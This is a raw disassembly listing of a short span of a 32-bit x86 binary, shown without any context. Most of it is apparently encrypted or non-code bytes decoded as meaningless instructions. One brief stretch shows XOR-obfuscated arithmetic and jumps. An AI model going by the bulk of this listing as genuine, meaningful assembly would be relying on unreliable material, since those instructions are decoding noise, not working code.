  4117ba:	pop    ss
  4117bb:	(bad)  
  4117bc:	mov    bl,0x87
  4117be:	sbb    al,0x35
  4117c0:	mov    dl,BYTE PTR [ebx]
  4117c2:	or     ah,cl
  4117c4:	mov    ch,0xe5
  4117c6:	mov    esi,0xa08e8223
  4117cb:	mov    bh,0x1c
  4117cd:	lods   al,BYTE PTR ds:[esi]
  4117ce:	je     0x411787
  4117d0:	sbb    BYTE PTR [edx-0x2f3bbebb],bh
  4117d6:	mov    esp,0x802f5be1
  4117db:	loopne 0x4117f9
  4117dd:	pop    edi
  4117de:	lods   eax,DWORD PTR ds:[esi]
  4117df:	int    0x71
  4117e1:	mov    dl,0xc1
  4117e3:	dec    edx
  4117e4:	mov    edx,0xa7c0e3fc
  4117e9:	xor    dl,ah
  4117eb:	pop    eax
  4117ec:	bound  ebp,QWORD PTR [ebx+0x7e]
  4117ef:	ret    0xb8d5
  4117f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4117f3:	aaa    
  4117f4:	jne    0x411872
  4117f6:	ss pop ecx
  4117f8:	(bad)  
  4117f9:	cmp    al,BYTE PTR [ecx-0x4cb78c3]
  4117ff:	(bad)  
  411800:	(bad)  
  411801:	fbld   TBYTE PTR [ebx-0x1f]
  411804:	mov    cl,0xba
  411806:	xchg   DWORD PTR [esi+0x42cae277],edx
  41180c:	iret   
  41180d:	hlt    
  41180e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41180f:	mov    esp,edx
  411811:	mov    ds:0xa644840,eax
  411816:	pop    edi
  411817:	mov    eax,?
  411819:	test   eax,0x72e2f8fe
  41181e:	or     eax,DWORD PTR [eax-0x2b61fd5]
  411824:	inc    cl
  411826:	enter  0xd189,0x4
  41182a:	shr    al,cl
  41182c:	dec    ebp
  41182d:	pop    ecx
  41182e:	dec    ebp
  41182f:	push   es
  411830:	mov    ds:0xd2b2aad0,al
  411835:	imul   DWORD PTR [eax]
  411837:	cmp    bl,BYTE PTR [edi]
  411839:	ja     0x4118a3
  41183b:	mov    esi,eax
  41183d:	xchg   ebx,eax
  41183e:	cmp    BYTE PTR [eax],ah
  411840:	pop    esp
  411841:	jnp    0x4118b8
  411843:	lock sbb al,0x33
  411846:	mov    bh,0xbd
  411848:	(bad)  [edi+0x35]
  41184b:	and    eax,0x71d93268
  411850:	push   ds
  411851:	mov    cl,0x48
  411853:	or     al,0x12
  411855:	dec    esp
  411856:	shl    BYTE PTR [eax],0x43
  411859:	add    eax,0xac315f50
  41185e:	out    dx,eax
  41185f:	imul   edx,esp,0x54d852c4
  411865:	rcr    DWORD PTR [ecx],1
  411867:	inc    edx
  411868:	ins    DWORD PTR es:[edi],dx
  411869:	in     al,0x5e
  41186b:	sub    eax,0x4059e33f
  411870:	inc    ebx
  411871:	dec    esp
  411872:	mov    WORD PTR [ecx-0x37],cs
  411875:	retf   0xe4f6
  411878:	mov    ds,WORD PTR [esi-0xb]
  41187b:	aad    0x6d
  41187d:	dec    esp
  41187e:	(bad)  
  41187f:	retf   
  411880:	int    0x74
  411882:	add    bh,0x1b
  411885:	push   es
  411886:	inc    esi
  411887:	ds aaa 
  411889:	lods   al,BYTE PTR fs:[esi]
  41188b:	inc    edx
  41188c:	nop
  41188d:	mov    DWORD PTR [edx-0x30],ebp
  411890:	inc    esi
  411891:	or     al,BYTE PTR [ebx-0x29]
  411894:	dec    edx
  411895:	retf   0x89a1
  411898:	pop    ebp
  411899:	rcr    ebp,0xd1
  41189c:	mov    esp,0xff7a1554
  4118a1:	pop    esp
  4118a2:	rol    esi,1
  4118a4:	out    0x9c,al
  4118a6:	sbb    eax,0x95c92620
  4118ab:	sar    DWORD PTR [eax],1
  4118ad:	adc    ah,BYTE PTR [eax+0x7c]
  4118b0:	dec    esi
  4118b1:	out    0x73,al
  4118b3:	out    dx,eax
  4118b4:	aaa    
  4118b5:	shl    BYTE PTR [eax+0x33],cl
  4118b8:	mov    BYTE PTR [ebp+0x397cc1fb],dh
  4118be:	hlt    
  4118bf:	mov    esi,0xbbfebf10
  4118c4:	out    0x2a,al
  4118c6:	into   
  4118c7:	(bad)  [edi+0x57dece25]
  4118cd:	jns    0x411926
  4118cf:	pop    edx
  4118d0:	icebp  
  4118d1:	pmuludq mm5,QWORD PTR [ebp+0x4f7cc3de]
  4118d8:	xchg   esi,eax
  4118d9:	jb     0x411905
  4118db:	pop    edi
  4118dc:	ret    
  4118dd:	icebp  
  4118de:	pop    es
  4118df:	outs   dx,BYTE PTR ds:[esi]
  4118e0:	sub    DWORD PTR [esi+0x1b671cdd],ebp
  4118e6:	ins    DWORD PTR es:[edi],dx
  4118e7:	imul   edx,DWORD PTR [edi],0xffffffe1
  4118ea:	cmp    esp,DWORD PTR [ebx+edi*4]
  4118ed:	call   0x90a4:0x87681f37
  4118f4:	mov    al,ah
  4118f6:	aad    0xdd
  4118f8:	sti    
  4118f9:	dec    edi
  4118fa:	add    al,0x73
  4118fc:	cmp    eax,0xfdb207f1
  411901:	jl     0x41191a
  411903:	mov    esp,0x966c746d
  411908:	outs   dx,BYTE PTR ds:[esi]
  411909:	dec    eax
  41190a:	xchg   ecx,eax
  41190b:	or     eax,0x3e422cc7
  411910:	push   edx
  411911:	pusha  
  411912:	lock sar WORD PTR [ebx],1
  411916:	cmp    ebx,DWORD PTR [esi+0x2487bccc]
  41191c:	xor    edi,DWORD PTR [ebx+0x2563313f]
  411922:	sahf   
  411923:	dec    edx
  411924:	lods   eax,DWORD PTR ds:[esi]
  411925:	xor    DWORD PTR [edx-0x39aa90e2],edx
  41192b:	mov    eax,ds:0x5da2cc5e
  411930:	add    DWORD PTR [eax-0x53],0x4d5786c8
  411937:	fcom   DWORD PTR [ebp-0x8]
  41193a:	mov    ebx,0xcbd6e9e9
  41193f:	mov    ?,eax
  411941:	mov    cl,0x68
  411943:	in     al,dx
  411944:	and    BYTE PTR [eax+0x1c828f0b],dh
  41194a:	adc    BYTE PTR [ebp-0x4de69634],ch
  411950:	aad    0x57
  411952:	ins    DWORD PTR es:[edi],dx
  411953:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411954:	fwait
  411955:	inc    eax
  411956:	popf   
  411957:	xchg   edx,ebp
  411959:	xchg   ecx,eax
  41195a:	adc    ah,BYTE PTR [edx+0x66]
  41195d:	bound  ecx,QWORD PTR [ecx]
  41195f:	jle    0x4119c2
  411961:	adc    esi,DWORD PTR [eax]
  411963:	je     0x4119ab
  411965:	aam    0xae
  411967:	dec    edx
  411968:	cmp    dl,cl
  41196a:	test   eax,0x8adb06bc
  41196f:	pop    es
  411970:	push   eax
  411971:	and    ecx,eax
  411973:	(bad)
  411976:	xchg   esp,eax
  411977:	add    BYTE PTR [edx-0x2a09e0f],0xa4
  41197e:	cmp    DWORD PTR [ebx],0xffffff93
  411981:	rcr    BYTE PTR [ebp+0x462286a],0x41
  411988:	jle    0x411a02
  41198a:	or     BYTE PTR [eax-0x6],0x1
  41198e:	jle    0x411961
  411990:	into   
  411991:	call   FWORD PTR [edi-0x17afe86a]
  411997:	popa   
  411998:	dec    eax
  411999:	mov    dh,0xe4
  41199b:	or     BYTE PTR [edx+ebx*8+0x4a],cl
  41199f:	outs   dx,DWORD PTR ds:[esi]
  4119a0:	dec    edi
  4119a1:	jae    0x4119c3
  4119a3:	mov    cl,0xd3
  4119a5:	mov    al,0x57
  4119a7:	lea    esi,[edx-0x6d037c0]
  4119ad:	imul   esp,eax,0x260f998
  4119b3:	std    
  4119b4:	and    BYTE PTR [edi+0x1bf63d56],dh
  4119ba:	(bad)  
  4119bb:	sbb    al,0x59
  4119bd:	mov    esi,0xe97b256c
  4119c2:	loop   0x4119e8
  4119c4:	xor    eax,0xdd080e64
  4119c9:	fcmovbe st,st(6)
  4119cb:	jecxz  0x4119fd
  4119cd:	pop    edx
  4119ce:	in     al,dx
  4119cf:	adc    edx,DWORD PTR [ebp-0x4b71ac5e]
  4119d5:	xchg   bl,ch
  4119d7:	clc    
  4119d8:	test   bh,0xa3
  4119db:	xlat   BYTE PTR ds:[bx]
  4119dd:	repnz retf 
  4119df:	sahf   
  4119e0:	jmp    0x2f0ab179
  4119e5:	sub    dh,BYTE PTR [ebx-0x2b]
  4119e8:	adc    ebp,DWORD PTR [ebx]
  4119ea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4119eb:	imul   edx,DWORD PTR [ecx],0xffffffc0
  4119ee:	and    al,0xd8
  4119f0:	adc    al,ah
  4119f2:	inc    esi
  4119f3:	ror    BYTE PTR [eax],1
  4119f5:	inc    eax
  4119f6:	jg     0x411a18
  4119f8:	addr16 sbb edx,edx
  4119fb:	mov    esi,0x70132faf
  411a00:	fld    DWORD PTR [eax+0x34]
  411a03:	dec    edx
  411a04:	cwde   
  411a05:	inc    esi
  411a06:	sub    DWORD PTR ds:0x8558bc6,0xffffff8b
  411a0d:	pop    ebp
  411a0e:	test   al,0x81
  411a10:	ret    0x8f8
  411a13:	push   edi
  411a14:	add    BYTE PTR [edi],cl
  411a16:	scas   eax,DWORD PTR es:[edi]
  411a17:	ror    DWORD PTR [ecx+0x558ba855],cl
  411a1d:	or     BYTE PTR [ebx-0x3d7e53a3],cl
  411a23:	(bad)  
  411a25:	add    BYTE PTR fs:[ebx],cl
  411a28:	ror    DWORD PTR [ecx+0x558bac55],cl
  411a2e:	or     BYTE PTR [ebx-0x2efc4fa3],cl
  411a34:	xor    edx,ebx
  411a36:	mov    DWORD PTR [ebp-0x50],edx
  411a39:	mov    edx,DWORD PTR [ebp+0x8]
  411a3c:	mov    ebx,DWORD PTR [ebp-0x4c]
  411a3f:	add    edx,edi
  411a41:	and    edx,ebx
  411a43:	mov    DWORD PTR [ebp-0x4c],edx
  411a46:	mov    edx,DWORD PTR [ebp+0x8]
  411a49:	mov    ebx,DWORD PTR [ebp-0x48]
  411a4c:	lea    edx,[ebx+edx*1+0x241fc1f]
  411a53:	mov    DWORD PTR [ebp-0x48],edx
  411a56:	mov    edx,DWORD PTR [ebp+0x8]
  411a59:	mov    ebx,0xfa5e15e2
  411a5e:	sub    ebx,edx
  411a60:	add    ebx,DWORD PTR [ebp-0x44]
  411a63:	mov    DWORD PTR [ebp-0x44],ebx
  411a66:	mov    edx,DWORD PTR [ebp+0x8]
  411a69:	xor    edx,eax
  411a6b:	add    edx,esi
  411a6d:	jne    0x40f670
  411a73:	mov    edx,DWORD PTR [ebp-0xc]
  411a76:	mov    dl,BYTE PTR [ebp+edx*1-0x9c]
  411a7d:	mov    bl,BYTE PTR [ebp-0x1]
  411a80:	cmp    dl,bl
  411a82:	je     0x413ee6
  411a88:	mov    ecx,DWORD PTR [ebp-0x5c]
  411a8b:	mov    edx,DWORD PTR [ebp-0xc]
  411a8e:	mov    dl,BYTE PTR [ebp+edx*1-0x9c]
  411a95:	mov    ebx,DWORD PTR [ebp+0xc]
  411a98:	xor    ecx,eax
  411a9a:	cmp    dl,BYTE PTR [ebx+ecx*1+0x3272e0]
  411aa1:	jne    0x418726
  411aa7:	mov    ecx,DWORD PTR [ebp-0x5c]
  411aaa:	mov    edx,DWORD PTR [ebp+0xc]
  411aad:	xor    ecx,eax
  411aaf:	movsx  ecx,BYTE PTR [edx+ecx*1+0x3272e0]
  411ab7:	mov    edx,DWORD PTR [ebp-0x18]
  411aba:	xor    edx,eax
  411abc:	add    edx,esi
  411abe:	cmp    ecx,edx
  411ac0:	mov    ecx,DWORD PTR [ebp-0x14]
  411ac3:	mov    DWORD PTR [ebp+0x8],ecx
  411ac6:	mov    ecx,DWORD PTR [ebp+0x8]
  411ac9:	je     0x41abb4
  411acf:	xor    ecx,eax
  411ad1:	add    ecx,esi
  411ad3:	mov    ecx,0x242ebed
  411ad8:	je     0x4162f4
  411ade:	mov    edx,DWORD PTR [ebp+0x8]
  411ae1:	mov    ebx,DWORD PTR [ebp-0x8]
  411ae4:	xor    edx,eax
  411ae6:	xor    ebx,eax
  411ae8:	sub    edx,ebx
  411aea:	sub    edx,esi
  411aec:	xor    edx,eax
  411aee:	mov    DWORD PTR [ebp+0x8],edx
  411af1:	mov    edx,DWORD PTR [ebp+0x8]
  411af4:	mov    ebx,DWORD PTR [ebp-0x58]
  411af7:	add    edx,0x5708f8
  411afd:	imul   edx,ebx
  411b00:	mov    DWORD PTR [ebp-0x58],edx
  411b03:	mov    edx,DWORD PTR [ebp+0x8]
  411b06:	mov    ebx,DWORD PTR [ebp-0x54]
  411b09:	add    edx,0x64f8da
  411b0f:	or     edx,ebx
  411b11:	mov    DWORD PTR [ebp-0x54],edx
  411b14:	mov    edx,DWORD PTR [ebp+0x8]
  411b17:	mov    ebx,DWORD PTR [ebp-0x50]
  411b1a:	add    edx,ecx
  411b1c:	xor    edx,ebx
  411b1e:	mov    DWORD PTR [ebp-0x50],edx
  411b21:	mov    edx,DWORD PTR [ebp+0x8]
  411b24:	mov    ebx,DWORD PTR [ebp-0x4c]
  411b27:	add    edx,edi
  411b29:	and    edx,ebx
  411b2b:	mov    DWORD PTR [ebp-0x4c],edx
  411b2e:	mov    edx,DWORD PTR [ebp+0x8]
  411b31:	mov    ebx,DWORD PTR [ebp-0x48]
  411b34:	lea    edx,[ebx+edx*1+0x241fc1f]
  411b3b:	mov    DWORD PTR [ebp-0x48],edx
  411b3e:	mov    edx,DWORD PTR [ebp+0x8]
  411b41:	mov    ebx,0xfa5e15e2
  411b46:	sub    ebx,edx
  411b48:	add    ebx,DWORD PTR [ebp-0x44]
  411b4b:	mov    DWORD PTR [ebp-0x44],ebx
  411b4e:	mov    edx,DWORD PTR [ebp+0x8]
  411b51:	xor    edx,eax
  411b53:	add    edx,esi
  411b55:	jne    0x411ade
  411b5b:	jmp    0x4162f4
  411b60:	jmp    0x413ee6
  411b65:	out    0x82,al
  411b67:	push   es
  411b68:	and    eax,0x81c5a506
  411b6d:	outs   dx,BYTE PTR ds:[esi]
  411b6e:	fs sub eax,0xa8d0fced
  411b74:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411b75:	cs scas al,BYTE PTR es:[edi]
  411b77:	jp     0x411bf3
  411b79:	add    DWORD PTR [edi+0x7a],ebx
  411b7c:	jp     0x411bde
  411b7e:	outs   dx,DWORD PTR ds:[esi]
  411b7f:	repz xor esp,DWORD PTR [ebx]
  411b82:	nop
  411b83:	cs mov esp,0x5ba2a09f
  411b89:	mov    es,WORD PTR [esi+0x4c913477]
  411b8f:	cld    
  411b90:	nop
  411b91:	pop    ebx
  411b92:	clc    
  411b93:	sbb    BYTE PTR [ebp+0x60276d6b],bl
  411b99:	stos   DWORD PTR es:[edi],eax
  411b9a:	gs sub al,0x8f
  411b9d:	sub    eax,0xe9adea06
  411ba2:	mov    eax,DWORD PTR [eax+0x6963cf77]
  411ba8:	mov    eax,0xa43ef554
  411bad:	popf   
  411bae:	or     BYTE PTR [ebx+0x1f881154],ch
  411bb4:	dec    eax
  411bb5:	inc    edx
  411bb6:	jnp    0x411c24
  411bb8:	addr16 xchg ebx,eax
  411bba:	pop    eax
  411bbb:	push   es
  411bbc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411bbd:	xlat   BYTE PTR ds:[ebx]
  411bbe:	sar    bh,0xaf
  411bc1:	push   ds
  411bc2:	in     al,0x7
  411bc4:	cli    
  411bc5:	in     al,dx
  411bc6:	mov    ah,dh
  411bc8:	out    0xc7,al
  411bca:	cmp    eax,0xf2993696
  411bcf:	ficomp DWORD PTR [edx-0x24fd70f8]
  411bd5:	pop    ss
  411bd6:	pop    ds
  411bd7:	lods   eax,DWORD PTR ds:[esi]
  411bd8:	rcl    BYTE PTR [edx-0x5b],0x34
  411bdc:	or     eax,0x64b5c432
  411be1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411be2:	imul   ebp,DWORD PTR [esi-0x7b8c9211],0x73f96f34
  411bec:	sub    DWORD PTR [eax],eax
  411bee:	mov    dl,0x44
  411bf0:	and    edx,DWORD PTR [ebx]
  411bf2:	xchg   edi,eax
  411bf3:	ret    
  411bf4:	loop   0x411bc2
  411bf6:	lods   al,BYTE PTR ds:[esi]
  411bf7:	pop    edx
  411bf8:	mov    BYTE PTR [ebx+edx*2-0x39ccd22],dl
  411bff:	xchg   DWORD PTR [edi-0x64589588],esp
  411c05:	adc    DWORD PTR [edi],0x2948201f
  411c0b:	mov    ah,0x59
  411c0d:	ins    DWORD PTR es:[edi],dx
  411c0e:	and    ah,bl
  411c10:	dec    ebp
  411c11:	jg     0x411bb0
  411c13:	or     al,0x60
  411c15:	out    dx,eax
  411c16:	and    esi,DWORD PTR [esi]
  411c18:	pop    edi
  411c19:	add    al,0xfe
  411c1b:	sub    DWORD PTR [edi+0x16],ecx
  411c1e:	jmp    0x6005a8d4
  411c23:	adc    al,al
  411c25:	je     0x411c8b
  411c27:	cwde   
  411c28:	ds aad 0xe9
  411c2b:	push   edx
  411c2c:	(bad)  
  411c2d:	popa   
  411c2e:	mov    edx,0x53c1e78
  411c33:	loopne 0x411bb5
  411c35:	mov    ch,0x93
  411c37:	es fs inc ecx
  411c3a:	push   ds
  411c3b:	fs sbb ah,al
  411c3e:	add    edx,DWORD PTR [eax]
  411c40:	fs inc eax
  411c42:	int    0xee
  411c44:	jp     0x411c12
  411c46:	mov    cl,0x40
  411c48:	ss mov cl,0xb8
  411c4b:	fmulp  st(2),st
  411c4d:	fsubr  QWORD PTR [ecx]
  411c4f:	and    ebx,DWORD PTR [edi-0x6d61af1b]
  411c55:	push   edi
  411c56:	xor    ecx,edx
  411c58:	neg    DWORD PTR [ecx]
  411c5a:	sbb    al,0xa7
  411c5c:	dec    edx
  411c5d:	rcl    DWORD PTR [eax+0x6],cl
  411c60:	popf   
  411c61:	pop    edi
  411c62:	jmp    0x411cb1
  411c64:	in     al,0x40
  411c66:	out    dx,eax
  411c67:	fsubr  DWORD PTR [eax+0x7f]
  411c6a:	fimul  WORD PTR [esp+ecx*1-0x15]
  411c6e:	pop    ds
  411c6f:	push   ds
  411c70:	push   0xfffffff8
  411c72:	push   ebx
  411c73:	popf   
  411c74:	inc    DWORD PTR ds:0xf2c8f5ae
  411c7a:	call   0x170d57b7
  411c7f:	(bad)  
  411c80:	dec    esp
  411c81:	xchg   ebx,eax
  411c82:	and    eax,0x9dc50db4
  411c87:	adc    esp,DWORD PTR es:[ecx]
  411c8a:	sbb    BYTE PTR [ebx-0x874536b],bl
  411c90:	dec    ecx
  411c91:	lock retf 0x8381
  411c95:	popa   
  411c96:	xor    esp,DWORD PTR [edi]
  411c98:	popa   
  411c99:	xor    al,0x35
  411c9b:	mov    ebp,0xfc2f63d2
  411ca0:	scas   eax,DWORD PTR es:[edi]
  411ca1:	sbb    al,0x93
  411ca3:	sar    DWORD PTR [edi+0x32c0ea0f],cl
  411ca9:	mov    dx,0x7c0a
  411cad:	adc    bl,BYTE PTR [ebx-0x59]
  411cb0:	xor    eax,0xe4ef9003
  411cb5:	retf   
  411cb6:	rcl    BYTE PTR [eax],1
  411cb8:	arpl   WORD PTR [edx],bx
  411cba:	mov    ebx,ebp
  411cbc:	push   ebx
  411cbd:	pop    esp
  411cbe:	repnz mov ds:0xe6b747c5,eax
  411cc4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411cc5:	aam    0x6e
  411cc7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411cc8:	ds ss ss lock sub eax,0x82667103
  411cd1:	stos   DWORD PTR es:[edi],eax
  411cd2:	lock xchg edx,eax
  411cd4:	sub    dl,dl
  411cd6:	(bad)
  411cd9:	push   edi
  411cda:	jnp    0x411d17
  411cdc:	inc    eax
  411cdd:	mov    al,0xfd
  411cdf:	lods   eax,DWORD PTR ds:[esi]
  411ce0:	popf   
  411ce1:	mov    dl,0xc9
  411ce3:	es loope 0x411cda
  411ce6:	mov    cl,0x41
  411ce8:	push   ecx
  411ce9:	mov    cl,0x15
  411ceb:	push   0x1952b922
  411cf0:	cmp    DWORD PTR [edi],edx
  411cf2:	test   DWORD PTR [ebx],esi
  411cf4:	cmp    BYTE PTR [edi-0x148e65b9],ah
  411cfa:	cmp    eax,0xb1f3930b
  411cff:	imul   esp,ebx,0x58f55be1
  411d05:	int3   
  411d06:	gs pop esi
  411d08:	and    BYTE PTR [edi-0x7f984708],bl
  411d0e:	cmp    dh,0x3
  411d11:	xchg   ebp,eax
  411d12:	test   eax,0xc3311383
  411d17:	test   eax,0x36ee7bbc
  411d1c:	lods   al,BYTE PTR ds:[esi]
  411d1d:	ins    BYTE PTR es:[edi],dx
  411d1e:	and    al,0x20
  411d20:	imul   esi,DWORD PTR cs:0x87eca421,0x6
  411d28:	test   DWORD PTR [ecx+esi*2],ebp
  411d2b:	pop    edi
  411d2c:	test   eax,esp
  411d2e:	lods   al,BYTE PTR ds:[esi]
  411d2f:	ffreep st(2)
  411d31:	dec    esi
  411d32:	stos   DWORD PTR es:[edi],eax
  411d33:	or     al,0xa8
  411d35:	sbb    al,0xcd
  411d37:	repz jo 0x411d3d
  411d3a:	xchg   BYTE PTR [esi+0x7],dh
  411d3d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411d3e:	pop    ss
  411d3f:	into   
  411d40:	cmp    eax,0x5fc571b5
  411d45:	add    BYTE PTR [edx],dl
  411d47:	dec    esp
  411d48:	ret    0xe600
  411d4b:	lea    edi,[edi]
  411d4d:	xchg   esi,eax
  411d4e:	retf   
  411d4f:	add    eax,0x8f537a41
  411d54:	pop    eax
  411d55:	xchg   esi,esp
  411d57:	xlat   BYTE PTR ds:[ebx]
  411d58:	add    eax,0x1c5463f5
  411d5d:	jbe    0x411d02
  411d5f:	dec    ebp
  411d60:	push   ss
  411d61:	loope  0x411dd4
  411d63:	adc    eax,0x49df9a73
  411d68:	xor    al,0x3d
  411d6a:	popf   
  411d6b:	clc    
  411d6c:	push   edx
  411d6d:	ret    
  411d6e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411d6f:	jg     0x411d59
  411d71:	mov    cl,0x9b
  411d73:	xchg   esp,eax
  411d74:	sub    edi,edi
  411d76:	push   ebx
  411d78:	inc    edi
  411d79:	pop    es
  411d7a:	stc    
  411d7b:	outs   dx,DWORD PTR ds:[esi]
  411d7c:	cmc    
  411d7d:	aas    
  411d7e:	mov    dl,0x6c
  411d80:	xchg   DWORD PTR [esi-0x5c],ebx
  411d83:	shl    BYTE PTR [eax+0x16],1
  411d86:	scas   eax,DWORD PTR es:[edi]
  411d87:	imul   ecx,DWORD PTR [edx-0x2],0x8
  411d8b:	ss es sub al,0x76
  411d8f:	xchg   BYTE PTR [edi],ch
  411d91:	mul    DWORD PTR [edx+0x16]
  411d94:	mov    ebp,DWORD PTR [ecx-0x70]
  411d97:	push   ecx
  411d98:	pop    es
  411d99:	mov    dl,0x68
  411d9b:	inc    esp
  411d9c:	cli    
  411d9d:	xor    esp,DWORD PTR [ecx+eax*1+0x638ae1da]
  411da4:	dec    ecx
  411da5:	mov    edx,0x6c00827b
  411daa:	nop
  411dab:	mov    ah,0x57
  411dad:	aas    
  411dae:	call   0x908fc442
  411db3:	add    DWORD PTR [esi-0x4d],0x2b
  411db7:	dec    ebp
  411db8:	jle    0x411ddc
  411dba:	mov    dh,0xe4
  411dbc:	pop    es
  411dbd:	sbb    al,0x8c
  411dbf:	push   0x5cfddc04
  411dc4:	arpl   WORD PTR [edi+0x3282ad5c],dx
  411dca:	enter  0xd61a,0xbf
  411dce:	pushf  
  411dcf:	scas   al,BYTE PTR es:[edi]
  411dd0:	int    0xe4
  411dd2:	mul    cl
  411dd4:	push   ebp
  411dd5:	cs daa 
  411dd7:	or     eax,0xc36b5c30
  411ddc:	sbb    BYTE PTR [ebx+0x2c],bl
  411ddf:	or     al,0x40
  411de1:	mov    esp,0xf2a3e152
  411de6:	or     BYTE PTR [edx+0x3b],bh
  411de9:	(bad)  
  411dea:	retf   0x63a5
  411ded:	sub    BYTE PTR [eax+0x62830849],bl
  411df3:	dec    ebx
  411df4:	mov    ah,0xd4
  411df6:	or     eax,ebx
  411df8:	add    ch,al
  411dfa:	cmc    
  411dfb:	aam    0x58
  411dfd:	sbb    ebx,DWORD PTR [edi-0x11]
  411e00:	mov    ss,ebx
  411e02:	jno    0x411e4e
  411e04:	arpl   WORD PTR [esi-0x17b8c7a1],bx
  411e0a:	push   es
  411e0b:	addr16 mov eax,ds:0xe60c
  411e0f:	sub    DWORD PTR [esi],0x32f1a7be
  411e15:	in     al,0xf8
  411e17:	xor    ah,dl
  411e19:	pop    eax
  411e1a:	push   ds
  411e1b:	mov    ecx,0x35fb3e85
  411e20:	xchg   esp,eax
  411e21:	mov    ebp,0xde4c1666
  411e26:	ret    
  411e27:	or     cl,BYTE PTR [edx]
  411e29:	bound  esi,QWORD PTR [edi+0x241309d3]
  411e2f:	dec    edx
  411e30:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411e31:	adc    DWORD PTR [ebp-0x11],edx
  411e34:	int3   
  411e35:	dec    esi
  411e36:	das    
  411e37:	push   0x60
  411e39:	mov    bl,0x9d
  411e3b:	xchg   bp,ax
  411e3d:	shl    DWORD PTR [eax-0x12],cl
  411e40:	sub    eax,0x8d69ab4f
  411e45:	xchg   ebp,eax
  411e46:	jmp    0xf7bb:0xeb910dea
  411e4d:	sbb    BYTE PTR [ebx-0x2e],ah
  411e50:	ja     0x411e3c
  411e52:	jb     0x411e6f
  411e54:	into   
  411e55:	push   0x3c
  411e57:	gs cwde 
  411e59:	icebp  
  411e5a:	into   
  411e5b:	mov    edi,0x9a3137b2
  411e60:	sub    BYTE PTR [eax+0x4c],al
  411e63:	sbb    eax,0xc7ec9311
  411e68:	push   ds
  411e69:	push   esi
  411e6a:	jo     0x411e51
  411e6c:	sub    eax,0x74a18068
  411e71:	pop    ebx
  411e72:	inc    ebp
  411e73:	xchg   ecx,eax
  411e74:	jbe    0x411ee6
  411e76:	das    
  411e77:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411e78:	xchg   edi,eax
  411e79:	or     ch,dl
  411e7b:	test   al,0xdc
  411e7d:	mov    al,BYTE PTR [bp-0x73]
  411e81:	push   0xffffffb0
  411e83:	gs xor cl,dl
  411e86:	int    0xd8
  411e88:	jmp    0x411eba
  411e8a:	daa    
  411e8b:	push   es
  411e8c:	mov    eax,ds:0xae512a60
  411e91:	jnp    0x411e26
  411e93:	shl    DWORD PTR [esi+0x42],0xc2
  411e97:	mov    fs,WORD PTR [edi-0x17]
  411e9a:	pop    ds
  411e9b:	retf   
  411e9c:	shl    BYTE PTR ds:0x246a9ca,0x46
  411ea3:	push   ss
  411ea4:	push   edi
  411ea5:	jb     0x411eff
  411ea7:	lahf   
  411ea8:	and    ah,BYTE PTR [edx]
  411eaa:	ss ins DWORD PTR es:[edi],dx
  411eac:	shl    DWORD PTR [ebp-0x65],cl
  411eaf:	repnz xchg esi,eax
  411eb1:	hlt    
  411eb2:	imul   eax,DWORD PTR [esi],0x9b657300
  411eb8:	xor    DWORD PTR [esi+0x4f],ecx
  411ebb:	cwde   
  411ebc:	cmp    al,0x9d
  411ebe:	push   cs
  411ebf:	push   ds
  411ec0:	dec    ebp
  411ec1:	out    0x58,al
  411ec3:	aam    0xba
  411ec5:	icebp  
  411ec6:	stos   DWORD PTR es:[edi],eax
  411ec7:	sub    DWORD PTR [edi-0x13604599],0x2b
  411ece:	sahf   
  411ecf:	add    DWORD PTR [edx-0x668de36d],esi
  411ed5:	cwde   
  411ed6:	mov    cl,0x61
  411ed8:	jmp    0x7f7e1593
  411edd:	enter  0x2231,0x52
  411ee1:	xchg   esi,eax
  411ee2:	lods   al,BYTE PTR ds:[esi]
  411ee3:	out    0x75,al
  411ee5:	push   eax
  411ee6:	js     0x411f23
  411ee8:	mov    esp,0x89a9d32e
  411eed:	pop    esi
  411eee:	add    al,0x54
  411ef0:	inc    edx
  411ef1:	add    dh,BYTE PTR [edi+0x1c]
  411ef4:	daa    
  411ef5:	add    esp,ebp
  411ef7:	xchg   esp,eax
  411ef8:	add    BYTE PTR [ebp-0x4984e095],ah
  411efe:	adc    eax,0x3b6a4ebc
  411f03:	out    0xd6,al
  411f05:	enter  0x609d,0x1b
  411f09:	jmp    0x5aba286b
  411f0e:	inc    ecx
  411f0f:	ds leave 
  411f11:	sbb    DWORD PTR [edi+edx*2+0x43217b86],0x432e6517
  411f1c:	arpl   WORD PTR [edx+0xc5c3860],ax
  411f22:	(bad)
  411f25:	bound  ebp,QWORD PTR [ebx+0x58]
  411f28:	int    0x5c
  411f2a:	shr    BYTE PTR [eax-0x7d526f10],1
  411f30:	aam    0xe2
  411f32:	retf   
  411f33:	ret    0xbbf
  411f36:	iret   
  411f37:	lea    ecx,[esi]
  411f39:	repz dec ebp
  411f3b:	cld    
  411f3c:	(bad)  [esi+0x37601b62]
  411f42:	push   es
  411f43:	push   ecx
  411f44:	repz jno 0x411fa5
  411f47:	add    eax,DWORD PTR [ebx+0xd7526a]
  411f4d:	iret   
  411f4e:	mul    BYTE PTR [ebx+0x30210811]
  411f54:	cmp    BYTE PTR [ebp+0x259eb3e2],ch
  411f5a:	dec    ebp
  411f5b:	push   ecx
  411f5c:	cmp    al,0x24
  411f5e:	bound  ebx,QWORD PTR [edi+0x46]
  411f61:	jb     0x411f23
  411f63:	in     al,dx
  411f64:	mov    eax,ds:0xa9ad7010
  411f69:	lods   al,BYTE PTR ds:[esi]
  411f6a:	sub    BYTE PTR [eax+0x5524716f],ch
  411f70:	add    DWORD PTR [esp+eiz*2+0x1ed63665],esp
  411f77:	pxor   mm5,QWORD PTR [ecx-0x423b61be]
  411f7e:	lods   eax,DWORD PTR ds:[esi]
  411f7f:	(bad)  
  411f80:	xchg   ecx,eax
